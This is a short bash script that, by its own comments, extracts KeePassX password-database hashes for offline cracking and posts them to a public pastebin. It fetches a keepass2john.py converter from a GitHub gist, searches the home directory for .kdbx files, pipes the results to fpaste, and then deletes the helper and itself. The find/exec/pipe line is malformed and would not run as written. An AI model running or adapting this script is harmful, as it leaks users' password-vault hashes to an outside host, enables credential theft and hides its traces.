#!/usr/bin/env bash
# 
# keepasshash.sh
#
# extract any found keepassx hashes for 
# offline cracking and paste to public pastebin
#
# fedora only (so to use the built-in fpaste)
#
# hash will be posted publically here: 
# https://paste.fedoraproject.org/archive
#
set +e

wget -c https://gist.githubusercontent.com/scottlinux/f6cb8b1bb7807e89c09c139064f69881/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py

find /home/$(whoami) -type f -iname *.kdbx -exec python keepass2john.py | fpaste {} \;

rm keepass2john.py && rm keepasshash.sh
